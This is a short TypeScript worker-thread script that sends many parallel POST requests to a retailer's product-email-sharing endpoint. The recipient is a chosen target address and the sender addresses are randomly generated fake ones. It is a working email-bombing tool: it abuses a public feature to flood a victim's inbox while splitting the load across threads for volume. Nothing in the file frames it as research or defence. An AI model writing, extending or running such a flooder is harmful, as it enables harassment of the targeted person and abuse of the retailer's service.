import { workerData, parentPort } from "worker_threads";

import fetch from "node-fetch";

let threadID = workerData.threadID;
let sendCount = Math.floor(workerData.count / workerData.threads);

if (threadID === workerData.threads - 1) {
  sendCount += workerData.count % workerData.threads;
}

function makeString(len: number): string {
  let str = "";
  for (let i = 0; i < len; i++) {
    str += String.fromCharCode(Math.floor(Math.random() * 26) + 97);
  }
  return str;
}

async function send() {
  const email =
      workerData.fromEmail || `${makeString(10)}@${makeString(10)}.com`,
    res = await fetch("https://www.homedepot.com/p/svcs/sendProductEmail", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
      },
      body: JSON.stringify({
        fromAddress: email,
        toAddress: workerData.email,
        sku: workerData.sku,
        storeId: workerData.storeId,
      }),
    });

  if (res.status !== 204) {
    throw new Error(`${res.status} ${await res.text()}`);
  } else {
    parentPort.postMessage({ threadID });
  }
}

for (let i = 0; i < sendCount; i++) {
  try {
    await send();
  } catch (err) {
    console.error(err);
    process.exit(1);
  }
}
